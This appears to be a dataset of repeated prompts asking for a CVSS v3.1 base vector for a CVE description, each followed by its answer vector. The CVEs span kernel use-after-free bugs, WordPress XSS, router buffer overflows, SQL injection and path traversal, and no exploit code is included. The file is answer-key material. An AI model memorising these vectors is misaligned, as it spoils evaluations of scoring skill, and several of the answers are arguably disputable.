Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel through 6.7.1, there is a use-after-free in cec_queue_msg_fh, related to drivers/media/cec/core/cec-adap.c and drivers/media/cec/core/cec-api.c. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Out-of-bounds Write vulnerabilities in svc1td_vld_plh_ap of libsthmbc.so prior to SMR Feb-2024 Release 1 allows local attackers to trigger buffer overflow. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings. The `Home > Preference` page exposes a list of system settings such as `Run Mode`, `Jwt Secret`, `Node Secret` and `Terminal Start Command`. While the UI doesn't allow users to modify the `Terminal Start Command` setting, it is possible to do so by sending a request to the API. This issue may lead to authenticated remote code execution, privilege escalation, and information disclosure. This vulnerability has been patched in version 2.0.0.beta.9. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Order Delivery Date for WP e-Commerce plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'available-days-tf' parameter in all versions up to, and including, 1.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Versions of the package network before 0.7.0 are vulnerable to Arbitrary Command Injection due to use of the child_process exec function without input sanitization. If (attacker-controlled) user input is given to the mac_address_for function of the package, it is possible for the attacker to execute arbitrary commands on the operating system that this package is being run on. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: : Relative Path Traversal vulnerability in B&R Industrial Automation Automation Studio allows Relative Path Traversal.This issue affects Automation Studio: from 4.0 through 4.12. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Exposure of Sensitive Information to an Unauthorized Actor vulnerability in IP2Location IP2Location Country Blocker.This issue affects IP2Location Country Blocker: from n/a through 2.33.3. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Operational Decision Manager 8.10.3, 8.10.4, 8.10.5.1, 8.11, 8.11.0.1, 8.11.1 and 8.12.0.1 is susceptible to remote code execution attack via JNDI injection when passing an unchecked argument to a certain API. IBM X-Force ID: 279145. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An OS Command Injection vulnerability exists in BIOVIA Materials Studio products from Release BIOVIA 2021 through Release BIOVIA 2023. Upload of a specially crafted perl script can lead to arbitrary command execution. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Micronaut Framework is a modern, JVM-based, full stack Java framework designed for building modular, easily testable JVM applications with support for Java, Kotlin and the Groovy language. Enabled but unsecured management endpoints are susceptible to drive-by localhost attacks. While not typical of a production application, these attacks may have more impact on a development environment where such endpoints may be flipped on without much thought. A malicious/compromised website can make HTTP requests to `localhost`. Normally, such requests would trigger a CORS preflight check which would prevent the request; however, some requests are "simple" and do not require a preflight check. These endpoints, if enabled and not secured, are vulnerable to being triggered. Production environments typically disable unused endpoints and secure/restrict access to needed endpoints. A more likely victim is the developer in their local development host, who has enabled endpoints without security for the sake of easing development. This issue has been addressed in version 3.8.3. Users are advised to upgrade. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Reflected cross-site scripting (XSS) vulnerabilities in Trend Micro Mobile Security (Enterprise) could allow an exploit against an authenticated victim that visits a malicious link provided by an attacker.  Please note, this vulnerability is similar to, but not identical to, CVE-2023-41177. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  soc: qcom: pmic_glink_altmode: fix drm bridge use-after-free  A recent DRM series purporting to simplify support for "transparent bridges" and handling of probe deferrals ironically exposed a use-after-free issue on pmic_glink_altmode probe deferral.  This has manifested itself as the display subsystem occasionally failing to initialise and NULL-pointer dereferences during boot of machines like the Lenovo ThinkPad X13s.  Specifically, the dp-hpd bridge is currently registered before all resources have been acquired which means that it can also be deregistered on probe deferrals.  In the meantime there is a race window where the new aux bridge driver (or PHY driver previously) may have looked up the dp-hpd bridge and stored a (non-reference-counted) pointer to the bridge which is about to be deallocated.  When the display controller is later initialised, this triggers a use-after-free when attaching the bridges:   dp -> aux -> dp-hpd (freed)  which may, for example, result in the freed bridge failing to attach:   [drm:drm_bridge_attach [drm]] *ERROR* failed to attach bridge /soc@0/phy@88eb000 to encoder TMDS-31: -16  or a NULL-pointer dereference:   Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000  ...  Call trace:    drm_bridge_attach+0x70/0x1a8 [drm]    drm_aux_bridge_attach+0x24/0x38 [aux_bridge]    drm_bridge_attach+0x80/0x1a8 [drm]    dp_bridge_init+0xa8/0x15c [msm]    msm_dp_modeset_init+0x28/0xc4 [msm]  The DRM bridge implementation is clearly fragile and implicitly built on the assumption that bridges may never go away. In this case, the fix is to move the bridge registration in the pmic_glink_altmode driver to after all resources have been looked up.  Incidentally, with the new dp-hpd bridge implementation, which registers child devices, this is also a requirement due to a long-standing issue in driver core that can otherwise lead to a probe deferral loop (see commit fbc35b45f9f6 ("Add documentation on meaning of -EPROBE_DEFER")).  [DB: slightly fixed commit message by adding the word 'commit'] 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: LlamaIndex (aka llama_index) through 0.9.34 allows SQL injection via the Text-to-SQL feature in NLSQLTableQueryEngine, SQLTableRetrieverQueryEngine, NLSQLRetriever, RetrieverQueryEngine, and PGVectorSQLQueryEngine. For example, an attacker might be able to delete this year's student records via "Drop the Students table" within English language input. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Vyper is a Pythonic Smart Contract Language for the EVM. There is an error in the stack management when compiling the `IR` for `sha3_64`. Concretely, the `height` variable is miscalculated. The vulnerability can't be triggered without writing the `IR` by hand (that is, it cannot be triggered from regular vyper code). `sha3_64` is used for retrieval in mappings. No flow that would cache the `key` was found so the issue shouldn't be possible to trigger when compiling the compiler-generated `IR`. This issue isn't triggered during normal compilation of vyper code so the impact is low. At the time of publication there is no patch available. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Exposure of sensitive information in exceptions in ClichHouse's clickhouse-r2dbc, com.clickhouse:clickhouse-jdbc, and com.clickhouse:clickhouse-client versions less than 0.4.6 allows unauthorized users to gain access to client certificate passwords via client exception logs. This occurs when 'sslkey' is specified and an exception, such as a ClickHouseException or SQLException, is thrown during database operations; the certificate password is then included in the logged exception message. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A use-after-free flaw was found in the __ext4_remount in fs/ext4/super.c in ext4 in the Linux kernel. This flaw allows a local user to cause an information leak problem while freeing the old quota file names before a potential failure, leading to a use-after-free. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WordPress Button Plugin MaxButtons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including 9.7.6 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. NOTE: This vulnerability was partially fixed in version 9.7.6. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as critical was found in Tongda OA 2017 up to 11.9. Affected by this vulnerability is an unknown functionality of the file /general/attendance/manage/ask_duty/delete.php. The manipulation of the argument ASK_DUTY_ID leads to sql injection. The exploit has been disclosed to the public and may be used. Upgrading to version 11.10 is able to address this issue. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-252991. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Lana Shortcodes WordPress plugin before 1.2.0 does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embed, which allows users with the contributor role and above to perform Stored Cross-Site Scripting attacks. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, was found in openBI up to 1.0.8. This affects the function uploadFile of the file /application/index/controller/File.php. The manipulation leads to unrestricted upload. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252309 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been found in Tenda i6 1.0.0.9(3857) and classified as critical. This vulnerability affects the function formSetCfm of the file /goform/setcfm of the component httpd. The manipulation of the argument funcpara1 leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252256. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Shanxi Diankeyun Technology NODERP up to 6.0.2 and classified as critical. This issue affects some unknown processing of the file application/index/common.php of the component Cookie Handler. The manipulation of the argument Nod_User_Id/Nod_User_Token leads to improper authentication. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252275. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Verification of Cryptographic Signature vulnerability in Snow Software Inventory Agent on Unix allows File Manipulation through Snow Update Packages.This issue affects Inventory Agent: through 7.3.1. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Deserialization of Untrusted Data vulnerability in Anton Bond Woocommerce Tranzila Payment Gateway.This issue affects Woocommerce Tranzila Payment Gateway: from n/a through 1.0.8. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the adv.iptv.stballvlans parameter in the function getIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WP-Invoice WordPress plugin through 4.3.1 does not have CSRF check in place when updating its settings, and is lacking sanitisation as well as escaping in some of them, allowing attacker to make a logged in admin change them and add XSS payload in them 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Autolab is a course management service that enables instructors to offer autograded programming assignments to their students over the Web. Path traversal vulnerabilities were discovered in Autolab's assessment functionality in versions of Autolab prior to 2.12.0, whereby instructors can perform arbitrary file reads. Version 2.12.0 contains a patch. There are no feasible workarounds for this issue. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An file upload vulnerability in Ivanti ITSM before 2023.4, allows an authenticated remote user to perform file writes to the server. Successful exploitation may lead to execution of commands in the context of non-root user. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Epiphyt Embed Privacy allows Stored XSS.This issue affects Embed Privacy: from n/a through 1.8.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: gpac v2.2.1 was discovered to contain a memory leak via the dst_props variable in the gf_filter_pid_merge_properties_internal function. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: route in main.c in Pico HTTP Server in C through f3b69a6 has an sprintf stack-based buffer overflow via a long URI, leading to remote code execution. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Arm provides multiple helpers to clean & invalidate the cache for a given region.  This is, for instance, used when allocating guest memory to ensure any writes (such as the ones during scrubbing) have reached memory before handing over the page to a guest.  Unfortunately, the arithmetics in the helpers can overflow and would then result to skip the cache cleaning/invalidation.  Therefore there is no guarantee when all the writes will reach the memory. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as problematic was found in EFS Easy File Sharing FTP 2.0. Affected by this vulnerability is an unknown functionality. The manipulation of the argument username leads to denial of service. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251479. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Juanpao JPShop up to 1.5.02. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file api/config/params.php of the component API. The manipulation of the argument JWT_KEY_ADMIN leads to use of hard-coded cryptographic key  . The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The identifier VDB-252997 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
